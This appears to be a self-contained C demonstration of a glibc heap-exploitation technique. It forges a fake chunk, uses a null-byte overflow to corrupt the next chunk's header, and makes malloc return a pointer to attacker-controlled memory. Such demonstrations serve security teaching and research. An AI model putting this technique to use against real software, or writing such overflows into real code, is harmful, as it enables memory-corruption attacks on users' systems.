#include <stdint.h>
#include <malloc.h>

int main() {
	uint8_t *a, *b, *c;

	a = (uint8_t *) malloc(0x10);
	int real_a_size = malloc_usable_size(a);
	fprintf(stderr, "malloc(0x10) for chunk a: %p, real size: %#x\n", a, real_a_size);

	size_t fake_chunk[6];

	fake_chunk[0] = 0x100;				// prev_size
	fake_chunk[1] = 0x100;				// size
	fake_chunk[2] = (size_t) fake_chunk;	// fd
	fake_chunk[3] = (size_t) fake_chunk;	// bk
	fake_chunk[4] = (size_t) fake_chunk;	// fd_nextsize
	fake_chunk[5] = (size_t) fake_chunk;	// bk_nextsize

	fprintf(stderr, "\nfake chunk: %p\n", fake_chunk);
	fprintf(stderr, "prev_size (not used): %#lx\n", fake_chunk[0]);
	fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
	fprintf(stderr, "fd: %#lx\n", fake_chunk[2]);
	fprintf(stderr, "bk: %#lx\n", fake_chunk[3]);
	fprintf(stderr, "fd_nextsize: %#lx\n", fake_chunk[4]);
	fprintf(stderr, "bk_nextsize: %#lx\n", fake_chunk[5]);

	b = (uint8_t *) malloc(0x100 - 8);
	uint64_t *b_size_ptr = (uint64_t *) (b - 8);
	fprintf(stderr, "\nmalloc(0xf8) for chunk b: %p, size: %#lx\n", b, *b_size_ptr);

	a[real_a_size] = 0;					// null byte poison
	size_t fake_size = (size_t) ((b - sizeof(size_t) * 2) - (uint8_t *) fake_chunk);
	*(size_t *) &a[real_a_size - sizeof(size_t)] = fake_size;
	fprintf(stderr, "null byte overflow!\n");
	fprintf(stderr, "b.prev_size: %#lx, b.size: %#lx\n", fake_size, *b_size_ptr);

	fprintf(stderr, "\nmodify fake chunk size to reflect b.prev_size\n");
	fake_chunk[1] = fake_size;			// size(P) == prev_size(next_chunk(P))

	free(b);
	fprintf(stderr, "free(b) and consolidate with fake chunk\n");
	fprintf(stderr, "fake chunk size: %#lx\n", fake_chunk[1]);

	c = malloc(0x100);
	fprintf(stderr, "\nmalloc(0x100) for chunk c: %p\n", c);
}
